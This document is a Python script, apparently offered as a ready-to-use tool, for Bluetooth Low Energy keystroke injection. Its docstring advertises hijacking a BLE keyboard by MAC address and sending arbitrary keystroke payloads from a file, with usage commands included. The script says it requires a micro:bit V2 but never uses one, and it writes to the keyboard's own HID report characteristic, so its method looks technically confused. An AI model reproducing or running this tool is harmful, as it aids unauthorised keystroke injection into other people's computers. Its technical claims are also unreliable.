# microbit_ble_hid_inject.py

"""
BLE HID Keystroke Injection for micro:bit V2

This script allows BLE keystroke injection attacks by:
- Hijacking a BLE keyboard (`--hid <target_mac>`) 
- Injecting predefined keystrokes (`--inject <file>`)

### Usage Examples:

1. Hijack a BLE keyboard and inject default payload:
   ```sh
   python microbit_ble_hid_inject.py --hid AA:BB:CC:DD:EE:FF
   ```

2. Inject a custom keystroke payload:
   ```sh
   python microbit_ble_hid_inject.py --hid AA:BB:CC:DD:EE:FF --inject attack_payload.txt
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
from bleak import BleakClient
import argparse

# Default Keystroke Payload
DEFAULT_PAYLOAD = [
    b'\x00\x00\x04',  # 'A'
    b'\x00\x00\x05',  # 'B'
    b'\x00\x00\x06'   # 'C'
]

# Inject Keystrokes into BLE HID Device
async def ble_hid_inject(target_mac, payload_file=None):
    """Injects keystrokes into a BLE keyboard."""
    print(f"[+] Hijacking BLE HID device {target_mac}...")
    payload = DEFAULT_PAYLOAD
    
    if payload_file:
        with open(payload_file, "r") as f:
            payload = [bytes.fromhex(line.strip()) for line in f.readlines()]
    
    async with BleakClient(target_mac) as client:
        for keystroke in payload:
            await client.write_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb", keystroke)
            print(f"[+] Injected Keystroke: {keystroke}")
            await asyncio.sleep(0.5)
    print("[+] Injection complete.")

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE HID Keystroke Injection for micro:bit V2")
    parser.add_argument("--hid", help="Target BLE HID device", metavar="target_mac")
    parser.add_argument("--inject", help="Inject keystrokes from a payload file", metavar="payload_file")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    if args.hid:
        loop.run_until_complete(ble_hid_inject(args.hid, args.inject))
